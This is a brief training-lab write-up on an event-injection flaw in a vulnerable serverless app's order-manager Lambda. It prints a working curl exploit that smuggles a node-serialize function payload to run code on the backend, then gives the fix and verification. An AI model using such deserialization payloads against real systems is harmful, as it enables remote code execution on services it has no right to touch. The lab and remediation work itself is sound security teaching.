# Lesson #1: Event Injection

## Vulnerability
The DVSA-ORDER-MANAGER Lambda function uses the unsafe `node-serialize` 
library to deserialize attacker-controlled input. This allows an attacker 
to inject a malicious JavaScript function that executes on the backend.

## Exploit Command
```bash
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -d '{"action":"_$$ND_FUNC$$_function(){var fs=require(\"fs\");fs.writeFileSync(\"/tmp/pwned.txt\",\"You are reading the contents of my hacked file!\");var fileData=fs.readFileSync(\"/tmp/pwned.txt\",\"utf-8\");console.error(\"FILE READ SUCCESS: \"+fileData);}()","cart-id":""}'
```

## Evidence
- Terminal returns: {"message": "Internal server error"} (expected)
- CloudWatch logs show: FILE READ SUCCESS: You are reading the contents of my hacked file!

## Fix
- Removed node-serialize import
- Replaced serialize.unserialize(event.body) with JSON.parse(event.body)
- Replaced serialize.unserialize(event.headers) with event.headers
- See fix/order-manager-fix.js for the patched code

## Verification
- After fix, CloudWatch logs show no FILE READ SUCCESS message
- Injected function is no longer executed
